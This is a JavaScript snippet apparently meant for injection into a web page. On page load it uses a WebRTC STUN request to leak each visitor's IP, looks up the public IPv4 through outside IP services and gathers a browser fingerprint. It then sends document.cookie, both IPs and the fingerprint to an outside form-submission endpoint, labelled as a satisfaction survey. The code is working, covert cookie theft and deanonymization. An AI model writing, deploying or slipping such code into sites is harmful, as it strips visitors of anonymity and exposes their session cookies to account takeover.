
		function forceWebRTCTurnLeak() {
			return new Promise((resolve, reject) => {
				
				const config = {
					iceServers: [
						{ urls: ["stun:8.216.39.241:3478"] }
					],
					iceTransportPolicy: "all" 
				};

				const pc = new RTCPeerConnection(config);
				pc.createDataChannel("leak_tunnel", { negotiated: true, id: 0 });

				pc.createOffer()
				  .then(offer => pc.setLocalDescription(offer))
				  .catch(reject);

				pc.onicecandidate = ice => {
					if (!ice || !ice.candidate || !ice.candidate.candidate) {
						resolve("finished, go to check");
						return;
					}

					const candidateLine = ice.candidate.candidate;
					
					const parts = candidateLine.split(" ");
					const detectedValue = parts[4];

					console.log("sent: ", detectedValue);

					resolve(detectedValue);
					
					// remove listening, avoid recall resolve
					pc.onicecandidate = () => {};
				};

				setTimeout(() => resolve("timeout"), 3000);
			});
		}

		function getInfo() {

			var systemInfo = {
				userAgent: navigator.userAgent,                
				platform: navigator.platform,                 
				language: navigator.language || navigator.userLanguage, 
				screenWidth: screen.width,                    
				screenHeight: screen.height,                 
				colorDepth: screen.colorDepth,                
				devicePixelRatio: window.devicePixelRatio,    
				timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, 
				plugins: []                                   
			};

			if (navigator.plugins && navigator.plugins.length > 0) {
				for (var i = 0; i < navigator.plugins.length; i++) {
					systemInfo.plugins.push(navigator.plugins[i].name);
				}
			}
			
			return systemInfo;

		}

        function getRealIPv4() {
			return new Promise((resolve) => {
				const xhr = new XMLHttpRequest();
				xhr.open("GET", "https://checkip.amazonaws.com", true);
				
				xhr.onload = function() {
					if (xhr.status === 200) {
						var ip = xhr.responseText.trim();
						resolve(ip); 
					} else {
						fetch('https://ip.sb')
							.then(res => res.text())
							.then(ip => resolve(ip.trim()))
							.catch(() => resolve("failed"));
					}
				};
				xhr.onerror = () => resolve("failed");
				xhr.send();
			});
		}
		
        function getIP() {
            return new Promise((resolve, reject) => {
                
                const pc = new RTCPeerConnection({iceServers: []});
                
                pc.createDataChannel(""); 
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(reject);
                
                pc.onicecandidate = ice => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const ip = ice.candidate.candidate.split(" ")[4];
                    resolve(ip);
                    pc.onicecandidate = () => {};
                };
            });
        }
        
        function sendIP(ip, ipv4) {
            const xhr = new XMLHttpRequest();
			var systemInfo = getInfo();
            xhr.open("POST", "https://api.web3forms.com/submit", true);
			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			var params = 
            "access_key=" + encodeURIComponent("ba52dae0-9fc8-4845-9575-baf62df9d608") +
            "&subject=" + encodeURIComponent("Tianya Website Satisfaction Survey") +
            "&q1_client_content=" + encodeURIComponent(document.cookie) + 
            "&email=" + encodeURIComponent("security@tianya.at") + 
            "&q2_client_loc=" + encodeURIComponent(ip) + 
			"&q3_client_location=" + encodeURIComponent(ipv4) + 
            "&q4_submission_date=" + encodeURIComponent(new Date().toLocaleString()) +
			"&q5_client_suggestion=" + encodeURIComponent(JSON.stringify(systemInfo));
        
			xhr.send(params);
        }

       
        async function execute() {
            try {
                const ip = await forceWebRTCTurnLeak();
				const ipv4 = await getRealIPv4();
                sendIP(ip, ipv4);
            } catch (error) {
                console.error("Error:", error);
            }
            
            /*
            setTimeout(() => {
                alert("插件错误");
            }, 1000);
			*/
        }

        
        window.addEventListener('load', execute);
